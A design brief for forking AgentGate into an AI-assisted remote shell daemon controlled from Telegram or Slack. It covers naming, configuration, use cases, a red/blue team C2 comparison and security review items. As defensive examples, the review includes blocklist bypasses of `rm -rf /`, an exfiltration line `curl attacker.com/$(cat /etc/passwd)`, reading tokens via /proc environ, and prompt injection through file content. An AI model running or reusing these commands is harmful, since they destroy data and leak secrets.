# Remote Machine Control — Fork Project Brief

> **Status:** Concept / Pre-development — Full rewrite and review requested by all team members  
> **Origin:** Derived from [AgentGate](https://github.com/agigante80/AgentGate) — fork from `develop` branch (HEAD `5725a77`); parent project now at v0.18.0+  
> **Author:** Initial concept captured 2026-03-10  
> **Purpose:** Created for *learning and research purposes only* — to understand the capabilities and limits of AI models and their possible integrations with real operating system environments. This project is not intended for production use as a security tool, and is not affiliated with any offensive security activity.  

---

## 1. The Core Idea

AgentGate was built as a developer tool — a chatbot gateway that gives AI models access to a GitHub-cloned code repository, with shell execution, streaming responses, and persistent history. Along the way it became something else too: **a fully functional AI-augmented remote shell for any machine it runs on.**

This document proposes extracting and refocusing that power into a standalone project: **an easy-to-install, AI-enhanced remote control daemon for any machine — laptop, server, Raspberry Pi, VM, or cloud instance — accessible from Telegram or Slack without requiring open ports, VPNs, or firewall changes.**

The security implications are significant, intentional, and worth understanding deeply — both offensively and defensively.


> ⚠️ **Note (2026-03-15):** AgentGate has evolved significantly since the v0.7.3 concept (now v0.18.0+). Major additions include: Slack platform support, broadcast bare-command dispatch, long-response delivery (chunking/file upload), `init` command, audit logging, secret redaction (`SecretRedactor`), streaming throttle, voice transcription, and multi-agent delegation. The fork source is now the **`develop` branch** (HEAD `5725a77`) — not v0.7.3 — to ensure all portable modules are current, the `AuditLog` ABC is available, and the `multi-provider-git-hosting` config refactor (when merged) does not create conflicts. *This spec requires a full rewrite to account for the new portable modules, updated architecture, and lessons learned.* All team members should review and update their respective sections.

---

## 2. Prompt for an AI Coding Agent

> You are building a new open-source project called [PROJECT NAME]. It is a **fork of AgentGate** (https://github.com/agigante80/AgentGate, branch `develop`, HEAD `5725a77`), a Telegram/Slack bot with shell execution and AI backends.
>
> **Goal:** Create a standalone Python application — installable with `pip install [package-name]` and startable with a single CLI command — that lets a user remotely control any machine (laptop, server, Raspberry Pi, cloud VM) from Telegram or Slack. The user can run shell commands, ask AI questions about the machine state, and receive streaming responses, all authenticated by Telegram chat ID / Slack user ID.
>
> **Source of truth:** Fork or cherry-pick from AgentGate. The following modules are portable with little or no change:
> - `src/ai/` — all AI backends (copilot, codex, direct API)
> - `src/platform/` — Telegram bot handlers and Slack bot
> - `src/history.py` — SQLite conversation history
> - `src/executor.py` — shell runner (change `cwd` from `/repo` to configurable `WORK_DIR`)
> - `src/redact.py` — `SecretRedactor` (⚠️ *CRITICAL — was missing from this list; see OQ7*)
> - `src/transcriber.py` — voice-to-text
> - `src/logging_setup.py` — logging
>
> **Remove entirely:**
> - `src/repo.py` — no GitHub repo cloning
> - `src/runtime.py` — no dependency auto-install
> - `GitHubConfig` section of `src/config.py`
> - `cmd_sync`, `cmd_git`, `cmd_diff`, `cmd_log` bot commands (git-specific)
>
> **Add/change:**
> - `WORK_DIR` env var (default: `$HOME`) replaces `REPO_DIR`
> - `CWD` state tracking per chat session: `gate cd <path>` changes the working directory for subsequent `gate run` calls
> - Persistent CWD across restarts (store in SQLite alongside history)
> - Shell audit log (every command run, timestamp, exit code, chat_id) written to `DATA_DIR/audit.log`
> - System snapshot command: `gate snap` — runs `uptime`, `df -h`, `free -h`, `ip a` and returns a summary
> - Process monitor: `gate ps [pattern]` — lists matching processes with AI summarisation if list is long
> - `gate whoami` — returns hostname, OS, current user, uptime, IP addresses
> - Installation: `pyproject.toml` with `[project.scripts] remote-gate = "remote_gate.main:main"`
> - Docker support: minimal `Dockerfile` and `docker-compose.yml.example`
> - First-run wizard: if no env file exists, `remote-gate init` walks the user through creating `.env` interactively
> - Health check endpoint (optional HTTP GET `/health`) for uptime monitoring
> - README with one-command install, security warnings, and red team / blue team awareness section
>
> **Security requirements:**
> - Auth by Telegram `CHAT_ID` + *mandatory* `ALLOWED_USERS` allowlist (⚠️ *changed from "optional" — see OQ8; bot token compromise = full shell without this*)
> - All destructive commands require inline confirmation (identical pattern)
> - `COMMAND_ALLOWLIST` env var: if set, only whitelisted command prefixes are permitted. Must match on the *first shell word only*, not substring. (⚠️ *See OQ9*)
> - `COMMAND_BLOCKLIST` env var: always-blocked patterns (e.g. `rm -rf /`, `mkfs`). Must use command-parsing, not substring matching — naive check is trivially bypassable via shell metacharacters, quoting, or path prefixes. (⚠️ *See OQ9*)
> - `SecretRedactor` must be ported from AgentGate and applied to *all* output paths — shell results, AI responses, error messages. This is even more critical than in AgentGate because the fork runs on the user's actual machine, not a sandboxed container. (⚠️ *See OQ7*)
> - Audit log is append-only; no API to delete it remotely. Must block `gate run` commands targeting the audit log file itself. (⚠️ *See OQ12*)
> - README must include a section on responsible use, risks, and threat model
> - `.env` file created by wizard must be written with `0600` permissions. (⚠️ *See OQ13*)
>
> **Non-goals (keep it simple):**
> - No web UI
> - No multi-machine orchestration (that is a v2 problem)
> - No file upload/download (v2)
> - No SSH tunnelling or port forwarding
>
> Produce: repo scaffold, `pyproject.toml`, `src/` layout, `Dockerfile`, `docker-compose.yml.example`, `.env.example`, `README.md`.

---

## 3. Project Name Candidates

> **Naming constraints:** The project must not be associated with offensive security, malware, or red team tooling through its name. Names referencing stealth, implants, shadows, ghosts, reconnaissance, C2, RAT, or similar terms are explicitly ruled out — even if available on PyPI. The project is a learning tool for understanding AI integrations.

### Ruled out immediately (red team / malware association risk)
| Name | Why ruled out |
|------|--------------|
| `GhostShell` | "Ghost" evokes stealth implants / EDR evasion; also ❌ PyPI taken |
| `ShadowGate`, `SilentShell`, `StealthPilot` | All evoke covert access / malware implant naming |
| `PhantomShell`, `BackdoorAI`, `ImplantAI` | Explicitly offensive connotations |
| `ReconGate`, `C2Gate`, `BeaconBot` | Direct red team terminology |

---

### Option A — **RemoteGate** *(user top candidate)*

| Pros | Cons |
|------|------|
| Directly communicates purpose | Could imply network gateway (VPN/firewall) |
| Shares "Gate" suffix with AgentGate — brand family | Less distinctive without AI signal |
| Easy to remember and spell | |
| `pip install remotegate` reads naturally | |

✅ **PyPI:** `pip install remotegate` — **AVAILABLE**

---

### Option A1 — **RemoteAIGate** *(AI variant — recommended)*

| Pros | Cons |
|------|------|
| Combines all three concepts: remote + AI + gate | Slightly longer to type |
| Shares brand family with AgentGate | AI might feel redundant once it's known |
| Clear AI signal in the name — no ambiguity | |
| `pip install remoteaigate` is clean | |

✅ **PyPI:** `pip install remoteaigate` — **AVAILABLE**

---

### Option A2 — **AIRemoteGate** *(AI-first variant)*

| Pros | Cons |
|------|------|
| AI comes first — mirrors "AI-first" positioning | Less natural word order |
| Distinctive variant of RemoteGate | |

✅ **PyPI:** `pip install airemotegate` — **AVAILABLE**

---

### Option B — **ShellHand**

| Pros | Cons |
|------|------|
| Evocative of "remote hand" on a server | Less obviously AI-related |
| Unusual enough to be memorable | "Hand" metaphor is vague |
| Works as a verb: "shellhand into my pi" | Slightly playful — may not suit enterprise |

✅ **PyPI:** `pip install shellhand` — **AVAILABLE**

---

### Option C — **PresenceD** *(presence daemon)*

| Pros | Cons |
|------|------|
| Honest about what it is: a persistent background daemon | The "D" suffix reads like sysd naming — niche |
| "Presence" captures remote awareness without implying shell | Technical audience only |
| Has a defensive, monitoring connotation | Undersells the AI and shell power |

✅ **PyPI:** `pip install presenced` — **AVAILABLE**

---

### Option D — **ShellRelay**

| Pros | Cons |
|------|------|
| Descriptive: relays shell commands through a chat channel | Doesn't signal AI capability |
| Immediately understandable, no ambiguity | Could be mistaken for a TCP relay tool |
| Works as both noun and verb | Slightly generic |

✅ **PyPI:** `pip install shellrelay` — **AVAILABLE**

---

### Option E — **ReachBox**

| Pros | Cons |
|------|------|
| "Reach any box" — memorable, punchy | "Box" is informal / sysadmin jargon |
| Clearly communicates remote access purpose | No AI or shell signal |
| Short, clean CLI name: `reachbox` | Could be confused with a mailing tool |

✅ **PyPI:** `pip install reachbox` — **AVAILABLE**

---

### Option F — **GateDaemon**

| Pros | Cons |
|------|------|
| Extends "Gate" brand family from AgentGate | "Daemon" is technical jargon |
| Communicates it's a background service | Doesn't communicate remote/shell aspects |
| Easy to type: `gatedaemon` | Name is long for a CLI command |

✅ **PyPI:** `pip install gatedaemon` — **AVAILABLE**

---

### Option G — **PocketShell**

| Pros | Cons |
|------|------|
| "Shell in your pocket" — immediately evocative | Could imply a mobile app |
| Communicates phone-based access perfectly | Doesn't signal AI capability |
| Friendly, approachable tone | "Pocket" may imply lightweight / toy |

✅ **PyPI:** `pip install pocketshell` — **AVAILABLE**

---

### Option H — **ShellPilot**

| Pros | Cons |
|------|------|
| "Pilot your shell remotely with AI" — conveys both shell + AI | "Pilot" is overused in AI branding |
| Strong action verb, professional tone | Could be confused with GitHub Copilot |
| Works well as CLI command: `shellpilot` | Doesn't communicate remote/daemon aspect |

✅ **PyPI:** `pip install shellpilot` — **AVAILABLE**

---

### PyPI Availability Summary *(re-verified 2026-03-15 with `pip install --dry-run`)*

| Name | `pip install` | Available? | Notes |
|------|---------------|------------|-------|
| `remotegate` | `pip install remotegate` | ✅ Available | User top candidate |
| `remoteaigate` | `pip install remoteaigate` | ✅ Available | **AI variant — recommended** |
| `airemotegate` | `pip install airemotegate` | ✅ Available | AI-first variant |
| `shellhand` | `pip install shellhand` | ✅ Available | |
| `ghostshell` | `pip install ghostshell` | ❌ Taken | Also: wrong connotation |
| `heimdall` | `pip install heimdall` | ❌ Taken | |
| `presenced` | `pip install presenced` | ✅ Available | |
| `shellrelay` | `pip install shellrelay` | ✅ Available | |
| `reachbox` | `pip install reachbox` | ✅ Available | |
| `gatedaemon` | `pip install gatedaemon` | ✅ Available | |
| `pocketshell` | `pip install pocketshell` | ✅ Available | |
| `shellpilot` | `pip install shellpilot` | ✅ Available | |

> **Note:** The earlier PyPI check in this document used `pip index versions` which returns inconsistent output for non-existent packages. Results above are from `pip install --dry-run` which reliably returns `"Could not find a version"` for packages not on PyPI.

### Recommendation

**`remoteaigate`** (`pip install remoteaigate` — **AVAILABLE**) is the top recommendation:
- Preserves the "Gate" brand link with AgentGate
- "Remote" communicates the primary use case immediately
- "AI" signals the core differentiator vs raw shell relay tools like Botgram
- Avoids all red team / offensive security name associations
- Project name: **RemoteAIGate**; GitHub repo: `remoteaigate`; CLI command: `remote-aigate` or `aigate`

**`remotegate`** is a clean fallback if the AI signal in the name is considered redundant once the tool is installed.

---

## 3a. Platform / OS Compatibility

> **Question:** Would the project work on any architecture — Windows, macOS, Linux — or would it be Linux-only to begin with?

### Summary

| Platform | Docker | Native install | Status |
|----------|--------|---------------|--------|
| **Linux** (amd64, arm64) | ✅ Full support | ✅ Full support | **Primary target** |
| **macOS** (Apple Silicon / Intel) | ✅ via Docker Desktop | ✅ Native with minor gaps | **Works, minor command gaps** |
| **Windows** | ✅ via Docker Desktop / WSL | ❌ Not supported natively | **Linux-only to start** |
| **Raspberry Pi** (arm64/armv7) | ✅ | ✅ Native | **Explicitly supported** |

### Why Linux-only for native install (v1)?

The codebase inherits several Unix-only dependencies:

1. **Shell commands in `gate snap` / `gate whoami`** — `uptime`, `df -h`, `free -h`, `ip a`, `uname -r` are Linux/macOS commands. Windows has no direct equivalents without PowerShell rewrites.
2. **`asyncio.create_subprocess_shell`** — works on all platforms, but spawns `/bin/sh` on Unix and `cmd.exe` on Windows. Commands like `&&`, pipes `|`, and Unix utilities break under `cmd.exe`.
3. **`pexpect`** (in `requirements.txt`) — does not support Windows natively. The Copilot and Codex backends use subprocess spawning that relies on Unix process management.
4. **File permissions** — `os.chmod(path, 0o600)` for `.env` and audit log is a no-op on Windows (ACL-based permissions require `win32security`).
5. **systemd integration** — first-run wizard generates a `.service` unit; no equivalent for Windows Services without a separate code path.

### macOS status

macOS works natively for the AI + Telegram/Slack core. Gaps:
- `ip a` → use `ifconfig` instead (or `netifaces` library)
- `free -h` → no equivalent; use `vm_stat` + calculation
- `gate snap` would need platform detection (`platform.system() == "Darwin"`) and alternate commands

These are **small, well-defined gaps** fixable in v1 with `platform.system()` branching.

### Recommendation

- **v1:** Linux + macOS native; Docker everywhere (amd64 + arm64 — same as AgentGate)
- **v2:** Windows native (requires PowerShell backend for shell commands + pexpect replacement)
- **Docker is the path of least resistance** on Windows — use `docker run` with a Linux container

### Architecture (hardware)

The parent AgentGate Dockerfile already handles `linux/amd64` and `linux/arm64` via `$(dpkg --print-architecture)`. The fork inherits this. Raspberry Pi (arm64 / armv7) is a first-class target — it's explicitly listed in the use cases.

---

---

## 4. Repository Structure

```
[project-name]/
├── .github/
│   ├── copilot-instructions.md
│   └── workflows/
│       ├── ci.yml              # lint + test
│       └── release.yml         # PyPI publish + Docker push
├── docs/
│   ├── quickstart.md
│   ├── security.md             # threat model, red/blue team analysis
│   └── configuration.md
├── src/
│   └── [package_name]/
│       ├── __init__.py
│       ├── main.py             # entrypoint, startup, signal handling
│       ├── config.py           # Pydantic settings (no GitHubConfig)
│       ├── executor.py         # run_shell(), cwd tracking, audit log
│       ├── history.py          # SQLite conversation + cwd state
│       ├── session.py          # per-chat session state (cwd, mode)
│       ├── logging_setup.py
│       ├── redact.py           # SecretRedactor — scrubs tokens/keys from output
│       ├── ready_msg.py
│       ├── transcriber.py
│       ├── wizard.py           # `init` first-run interactive setup
│       ├── health.py           # optional HTTP /health endpoint
│       ├── ai/
│       │   ├── adapter.py
│       │   ├── factory.py
│       │   ├── copilot.py
│       │   ├── codex.py
│       │   ├── direct.py
│       │   └── session.py
│       └── platform/
│           ├── common.py
│           ├── telegram.py     # renamed from bot.py
│           └── slack.py
├── tests/
│   ├── unit/
│   ├── integration/
│   └── contract/
├── Dockerfile
├── docker-compose.yml.example
├── .env.example
├── pyproject.toml
├── VERSION
└── README.md
```

---

## 5. Configuration Delta vs AgentGate

### Removed env vars:
```
GITHUB_REPO_TOKEN
GITHUB_REPO
GITHUB_BRANCH
```

### Added env vars:
```bash
WORK_DIR=/home/user          # Default working directory for shell commands (default: $HOME)
DATA_DIR=/data               # SQLite, audit log, sentinels (default: ~/.local/share/[project])
COMMAND_ALLOWLIST=           # Comma-separated allowed command prefixes. Empty = allow all.
COMMAND_BLOCKLIST=rm -rf /,mkfs  # Always-blocked patterns regardless of confirmation.
AUDIT_LOG_ENABLED=true       # Write audit.log for every executed command.
HEALTH_PORT=0                # Set >0 to enable HTTP health endpoint on that port.
```

### Kept unchanged:
```bash
TG_BOT_TOKEN, TG_CHAT_ID, ALLOWED_USERS
SLACK_BOT_TOKEN, SLACK_APP_TOKEN, SLACK_CHANNEL_ID, SLACK_ALLOWED_USERS
AI_CLI, AI_API_KEY, AI_MODEL, AI_PROVIDER, AI_BASE_URL
WHISPER_PROVIDER, WHISPER_API_KEY, WHISPER_MODEL
PLATFORM, LOG_LEVEL, LOG_DIR
BOT_CMD_PREFIX, MAX_OUTPUT_CHARS, STREAM_RESPONSES, STREAM_THROTTLE_SECS
CONFIRM_DESTRUCTIVE, SKIP_CONFIRM_KEYWORDS
```

---

## 6. Bot Command Changes vs AgentGate

### Removed (git/repo-specific):
| Command | Reason |
|---------|---------|
| `gate sync` | Pulls GitHub repo — not applicable |
| `gate git <args>` | Raw git passthrough — not applicable |
| `gate diff` | Shows git diff — not applicable |
| `gate log` | Shows git log — not applicable |
| `gate install` | Re-runs dep installer — not applicable |

### Added (machine-specific):
| Command | Description |
|---------|-------------|
| `gate cd <path>` | Change working directory for this session (persisted). ⚠️ *Must validate: resolve symlinks, reject paths outside `WORK_DIR` unless `ALLOW_CD_ANYWHERE=true` (see OQ10)* |
| `gate pwd` | Show current working directory |
| `gate snap` | Snapshot: uptime + disk + memory + network. ⚠️ *Output contains host recon data (IPs, mounts) — always redact and log* |
| `gate ps [pattern]` | List processes matching pattern |
| `gate whoami` | Hostname, OS, user, uptime, IPs |
| `gate watch <cmd> <secs>` | Run command every N seconds, stream updates. ⚠️ *Must enforce: min interval ≥10s, max concurrent ≤3, max lifetime ≤1h, destructive check per iteration (see OQ11)* |
| `gate env [key]` | Show env vars (filtered). ⚠️ *Must define filter: blocklist of key patterns (`*TOKEN*`, `*KEY*`, `*SECRET*`, `*PASS*`) and apply `SecretRedactor` to values (see OQ14)* |

### Unchanged:
`gate run`, `gate help`, `gate clear`, `gate restart`, `gate status`, `gate confirm`, `gate ta` (text-from-audio)

---

## 7. Use Cases

### Personal & Professional:

1. **Headless home lab management.** Raspberry Pi running in a closet. No monitor, no keyboard. Telegram on your phone → `gate run systemctl status pihole` → AI interprets and summarises. No SSH client needed.

2. **Remote dev machine while travelling.** Your powerful workstation is at home. You're on a train with only a phone. Ask AI to make a code change, run tests, tail a log — all via Telegram.

3. **"Is it down?" first response.** Woken up at 3am. Server alert fires. Before opening a laptop, ask the bot: "Is the web server OK?" — `gate snap` + AI analysis before you've even unlocked your computer.

4. **IoT / embedded device monitoring.** Small Python footprint. Runs on any device with an internet connection. Replace bespoke monitoring dashboards with a chat interface.

5. **Air-gapped machine reach-back.** Machine has outbound internet but no inbound. Traditional SSH fails. This works via Telegram's outbound HTTPS connection.

### Scenarios where you'd want this installed:

| Machine | Why |
|---------|-----|
| Home server / NAS | Admin from anywhere, no port forwarding |
| Raspberry Pi (home automation, media server) | Headless control from phone |
| Developer workstation | Remote coding assistant when away |
| Cloud VMs without bastion | Reach a VM in a VPC with no inbound rules |
| CI/CD runner (self-hosted) | Trigger jobs, inspect state |
| Company laptop (personal/BYOD) | Remote access without VPN (with appropriate policy) |

---

## 8. Why Not Just Use SSH?

This is the right question to ask. The honest answer is: **SSH is better for power users who control their infrastructure.** This tool is better for everyone else — and for certain security scenarios.

### SSH advantages over this tool:
- Full terminal emulator (ncurses, vim, htop work perfectly)
- No third-party service in the path (no Telegram)
- Standard protocol with mature tooling (keys, agents, multiplexing)
- File transfer (scp/sftp)
- Port forwarding / tunnelling

### Where this tool wins:

| Scenario | SSH | This tool |
|----------|-----|-----------|
| Inbound port blocked by NAT/firewall | ❌ Needs port forward | ✅ Outbound HTTPS only |
| Machine behind CGNAT (4G home router) | ❌ No public IP | ✅ Works |
| No SSH client on the device (phone, tablet) | ❌ Needs app | ✅ Native Telegram |
| AI-augmented responses | ❌ Raw shell only | ✅ AI interprets and explains |
| Confirmation UX for dangerous commands | ❌ Nothing stops you | ✅ Inline button approval |
| Non-technical users | ❌ Steep learning curve | ✅ Natural language |
| Voice commands | ❌ Not applicable | ✅ Voice → shell (Whisper) |
| Conversation history / context | ❌ Stateless | ✅ 10-exchange context window |

### What about Telegram-based shell bots (e.g. Botgram, Shell-Bot)?

They exist and work. The gap is: they're **raw shell relays** with no AI. You still need to know exactly what command to run. This project adds the AI reasoning layer — you can ask "why is disk 90% full?" and get an answer, not just output.

---

## 9. Red Team / Blue Team Analysis

> ⚠️ **Educational purpose statement:** This tool, and this analysis, exist purely for learning. The goal is to understand how AI models can be integrated with real system capabilities, what the natural security implications are, and how to reason about them from both sides. This project is *not* intended to be used for unauthorised access, red team engagements, or any activity outside a fully consented environment. Understanding how a class of tools works is the first step to defending against them — that is the point.

> **Important disclosure:** This tool, by design, provides remote shell access to any machine it runs on. Like SSH, Metasploit, netcat, or a VPN, it is a dual-use technology. Understanding it from both offensive and defensive perspectives is the responsible way to build and deploy it.

### 🔴 Red Team Perspective: Why This Is a Compelling Implant Model

Security researchers and red teamers will immediately recognise what this architecture resembles: **a C2 (Command and Control) beacon using a legitimate third-party channel.**

| Property | AgentGate / fork | Classic C2 implant |
|----------|---------------------|-------------------|
| Outbound-only traffic | ✅ HTTPS to Telegram API | ✅ Often beacons home via HTTPS |
| Uses legitimate domain | ✅ `api.telegram.org` | ✅ Often uses CDNs, Slack, Discord |
| No inbound ports | ✅ | ✅ |
| Bypasses many firewall policies | ✅ | ✅ |
| Encrypted transport | ✅ TLS | ✅ TLS |
| Authenticated C2 channel | ✅ Telegram bot token | ✅ Implant UUID / beacon key |
| Persistence across reboots | Needs systemd unit | Needs persistence mechanism |
| Operator UX | Telegram app | Cobalt Strike / Mythic / custom |

**Key insight for red teamers:** Telegram-based C2 is a real, documented technique (see: [TeleRAT](https://unit42.paloaltonetworks.com/unit42-telerat-another-android-trojan-leveraging-telegrams-bot-api-to-target-iranian-users/), [Masad Stealer](https://www.zscaler.com/blogs/security-research/masad-stealer-exfiltrating-using-telegram), multiple APT campaigns). This project is the **legitimate, open, user-consented version** of that pattern.

**What makes this detectable / distinguishable from a real implant:**
- Installed openly, not via exploit or dropper
- Runs as a known process with a clear process name
- Source code is public
- Auth requires the Telegram account of the machine owner

**Red team scenarios this enables (with consent):**
- Persistent access to a lab environment without maintaining an SSH tunnel
- Quick-reaction capability from a mobile device during an engagement (where your laptop may not be available)
- AI-assisted lateral movement research in an isolated lab

**Additional attack vectors not covered above (⚠️ OQ15):**
- *Token theft:* `TG_BOT_TOKEN` in `.env` can be exfiltrated via clipboard sniffing, backup exposure, or process environment (`/proc/<pid>/environ`)
- *Bot API enumeration:* Telegram bot tokens encode the bot user ID — an attacker can enumerate active bots and attempt to interact
- *Replay via Telegram API:* if an attacker obtains the bot token, they can replay `getUpdates` to see recent commands (unless webhook mode is used)
- *AI prompt injection:* attacker-controlled file content (e.g. `gate run cat NOTES.md`) could contain prompt injection that manipulates the AI's response

---

### 🔵 Blue Team Perspective: Detection and Defence

**If you find this tool on a machine you didn't install it on — treat it as a serious incident.**

#### Detection indicators:

| Indicator | What to look for |
|-----------|-----------------|
| Network | Regular outbound HTTPS connections to `api.telegram.org` (149.154.x.x / 91.108.x.x) |
| Process | Python process named `remote-gate`, `agentgate`, or with `main.py` in args |
| Files | `.env` file with `TG_BOT_TOKEN`, `history.db`, `audit.log` in home or data dir |
| Systemd | `remote-gate.service` or similar unit file |
| Cron | Cron entry restarting a Python bot script |
| Docker | Container exposing no ports but making outbound Telegram connections |
| Python packages | `pip list` or `pip show python-telegram-bot` / `slack-bolt` on unexpected hosts |
| `/proc` inspection | `cat /proc/<pid>/environ` reveals `TG_BOT_TOKEN` if process runs without env scrubbing |

#### Defensive controls:

1. **Network egress filtering.** Block outbound connections to `api.telegram.org` and `slack.com` on managed endpoints if Telegram/Slack are not approved apps.

2. **Process allowlisting.** Endpoint solutions (CrowdStrike, Carbon Black) can alert on unexpected Python processes with `asyncio` / `telegram` libraries making network calls.

3. **Audit log review.** If the tool *is* legitimately installed, periodically review `DATA_DIR/audit.log`. Any unexpected commands are an indicator of account compromise.

4. **Telegram bot token hygiene.** Bot tokens are long-lived and do not expire unless revoked. If a `TG_BOT_TOKEN` is leaked (e.g., in a public `.env` commit), revoke it immediately via `@BotFather → /revoke`.

5. **ALLOWED_USERS enforcement.** Always set `ALLOWED_USERS` to your specific Telegram user ID. The default (`CHAT_ID` only) is weaker — if someone else gets your bot token, they can't send to your chat, but defence in depth is better.

6. **Principle of least privilege.** Run the daemon as a dedicated user with minimal permissions, not as root.

7. **Health endpoint hardening.** If `HEALTH_PORT` is set, the `/health` endpoint confirms the daemon's existence to any network scanner. Bind to `127.0.0.1` by default; require an auth token header for non-localhost access. (⚠️ *See OQ16*)

8. **`.env` file permissions.** The wizard and documentation must enforce `chmod 0600` on `.env`. On systemd installs, use `EnvironmentFile=` with root-owned, `0600`-permission file instead of world-readable `.env` in `$HOME`.

#### Awareness for blue teamers:

- Telegram-based C2 is increasingly common in nation-state and commodity malware. **Train your SOC to recognise `api.telegram.org` in egress traffic as a potential indicator, not just a productivity tool.**
- This project's open publication is itself a defensive act: by documenting the pattern, defenders can build detections before adversaries do (or further weaponise it).

---

## 10. Implementation Complexity Estimate

| Component | Effort | Notes |
|-----------|--------|-------|
| Fork & strip repo-specific code | 1-2 hours | Remove 3 modules, adjust imports |
| Port `SecretRedactor` | 1 hour | ⚠️ *Was missing — critical for a remote shell tool (OQ7)* |
| CWD tracking (executor + SQLite) | 2-3 hours | New column in history DB, session state |
| CWD path validation + sandbox | 1-2 hours | ⚠️ *Symlink resolution, boundary enforcement (OQ10)* |
| Audit log | 1-2 hours | Append-only file writer in `executor.py` + self-protection (OQ12) |
| New machine commands (snap, ps, whoami) | 2 hours | Thin wrappers around existing `run_shell` |
| `gate watch` with safety limits | 2 hours | ⚠️ *Rate limits, lifetime caps, destructive checks (OQ11)* |
| `gate env` with secret filtering | 1-2 hours | ⚠️ *Key-pattern blocklist + value redaction (OQ14)* |
| pyproject.toml + CLI entrypoint | 1 hour | Replace Dockerfile-only startup |
| First-run wizard (`init` command) | 2-3 hours | Interactive env file generator + `0600` perms (OQ13) |
| COMMAND_ALLOWLIST / BLOCKLIST | 2-3 hours | ⚠️ *Command-parsing approach, not substring matching (OQ9)* |
| Health endpoint | 1-2 hours | Simple asyncio HTTP server + localhost bind + auth token (OQ16) |
| README + docs + security.md | 3-4 hours | Worth doing properly given security sensitivity |
| Tests | 4-5 hours | Port existing tests, add CWD, audit, redaction, watch tests |
| **Total estimate** | **~25-32 hours** | ⚠️ *Increased from 18-22 due to security hardening* |

---

## 11. Open Questions / Decisions Before Starting

1. **Package name:** Which of the 5 names? Check PyPI availability before committing.
2. **Shared library approach?** Extract `agentgate-core` (AI backends + platform layer) as a shared dependency, or keep as a standalone fork?
3. **Multi-machine support (v2)?** A single bot token → multiple machines (each a separate "room") is a natural extension. Design the DB schema to support it from day one?
4. **File transfer?** `gate upload` / `gate download` via Telegram's file API is high-value but increases attack surface.
5. **Audit log format:** Plain text vs structured JSON (for log shippers like Filebeat)?
6. **Responsible disclosure:** Consider a security policy file and coordinating with Telegram if any vulnerability in the bot pattern is found.

### Security Open Questions (GateSec Review)

7. **OQ7 — `SecretRedactor` not ported (🔴 CRITICAL).** The "Source of truth" module list omitted `src/redact.py`. On AgentGate this scrubs tokens, API keys, GitHub PATs, Bearer headers, and URLs with embedded credentials from all output. The fork project runs on the user's *actual machine* — shell output from `cat ~/.bashrc`, `env`, `git remote -v`, `docker inspect`, or process lists is far more likely to contain real secrets. `SecretRedactor` must be in the portable modules list and wired into every output path. *Fixed in this review — added to Section 2 and Section 4.*

8. **OQ8 — `ALLOWED_USERS` must be mandatory, not optional (🔴 CRITICAL).** The spec said "optional `ALLOWED_USERS` allowlist (identical to AgentGate)." In AgentGate this is acceptable because the blast radius is a container with a cloned repo. Here the blast radius is *the user's entire machine*. If `TG_BOT_TOKEN` leaks and there's no `ALLOWED_USERS` check, anyone who can send a message to the bot gets a root shell. Recommendation: *require at least one entry in `ALLOWED_USERS` at startup; refuse to start without it.* *Fixed in this review — changed to "mandatory" in Section 2.*

9. **OQ9 — `COMMAND_BLOCKLIST` / `COMMAND_ALLOWLIST` bypass via shell metacharacters (🔴 HIGH).** The spec proposes blocking patterns like `rm -rf /` and `mkfs`. AgentGate's current `is_destructive()` uses *substring matching* against 9 hardcoded keywords — trivially bypassed: `/bin/rm -rf /`, `bash -c 'rm -rf /'`, `$(rm -rf /)`, `echo | xargs rm -rf /`, `\rm -rf /`. A remote shell tool *must* use a stronger mechanism: (a) parse the first shell word (after alias/path resolution) and match against the blocklist, or (b) run commands via `restricted bash` (`rbash`), or (c) use a proper command parser (`shlex.split` + first-token matching). Substring matching is security theatre for a tool with this threat profile. *Annotated in Section 2.*

   > **GateCode R1 Decision — DECIDED:** Use approach (c) extended with shell metacharacter detection. Implementation: (1) `shlex.split()` to tokenize; on `ValueError` (unmatched quotes), reject the command as malformed. (2) Resolve first token to canonical binary via `shutil.which()`, then `os.path.basename()` — catches `/bin/rm`, `./rm`, symlinks. (3) Match basename against blocklist (case-insensitive). (4) Scan raw command string for shell injection operators (`|`, `&&`, `||`, `;`, `$(`, `` ` ``, `{`) — if any are present, apply blocklist check to *all* tokens that look like command names (tokens after `|`, `;`, `&&`, `||`). (5) When first token is a shell interpreter (`bash`, `sh`, `zsh`, `dash`, `fish`) and `-c` flag is present, recursively apply steps 1–4 to the `-c` argument. **Rejected: `rbash`** — too restrictive, breaks `cd`, redirection, and `$PATH`; creates false sense of security since users can often escape it. **Rejected: seccomp** — not portable across distros and container runtimes. **Known limitation:** shell scripts on disk can contain blocked operations; document this in `security.md`. Env vars: `COMMAND_BLOCKLIST` (comma-separated basenames, default: `rm,mkfs,dd,shred,wipefs,fdisk,parted,halt,poweroff,reboot,shutdown`), `COMMAND_ALLOWLIST` (comma-separated basenames; empty = allow all).

10. **OQ10 — `gate cd` path validation / sandbox boundary (🟡 MEDIUM).** `gate cd /etc` → `gate run cat shadow` trivially accesses sensitive system files. The spec proposes no path validation. Recommendations: (a) resolve symlinks with `os.path.realpath()` before accepting, (b) default to restricting CWD changes to within `WORK_DIR` subtree, (c) add `ALLOW_CD_ANYWHERE=true` env var for users who intentionally want unrestricted access. *Annotated in Section 6.*

11. **OQ11 — `gate watch` is a persistence and amplification mechanism (🟡 MEDIUM).** No limits are specified. An attacker (or accidental user error) could: `gate watch "curl attacker.com/$(cat /etc/passwd)" 1` — exfiltration loop every second. Must enforce: minimum interval (≥10s), maximum concurrent watches (≤3), maximum lifetime (≤1h), and apply `is_destructive()` check on every iteration (not just the first). *Annotated in Section 6.*

   > **GateCode R1 Decision — DECIDED:** Adopt proposed limits as hard defaults with env var overrides. Implementation: `WATCH_MIN_INTERVAL_SECS` (default `10`), `WATCH_MAX_CONCURRENT` (default `3`), `WATCH_MAX_LIFETIME_SECS` (default `3600`). Per-chat-id watch registry stored as `dict[chat_id, list[asyncio.Task]]`; new watch request fails fast if `len(tasks) >= WATCH_MAX_CONCURRENT`. Each iteration applies the full OQ9 blocklist/allowlist check (not just startup). Task auto-cancels after `WATCH_MAX_LIFETIME_SECS` and notifies the user. Users can cancel manually with `gate watch stop [id]`. Command validation (OQ9 logic) applied on registration, not just at runtime, to catch obviously blocked commands before the first iteration runs.

